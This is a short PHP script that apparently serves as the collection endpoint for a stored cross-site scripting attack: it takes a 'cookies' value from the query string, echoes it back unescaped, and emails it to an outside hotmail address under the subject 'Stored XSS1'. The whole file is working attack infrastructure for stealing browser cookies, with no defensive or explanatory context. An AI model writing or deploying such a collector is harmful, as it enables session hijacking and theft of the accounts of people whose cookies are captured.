<?php
 
$message = $_GET["cookies"];
echo($message);
mail('brunoapps@hotmail.fr', 'Stored XSS1', $message);
 
?>
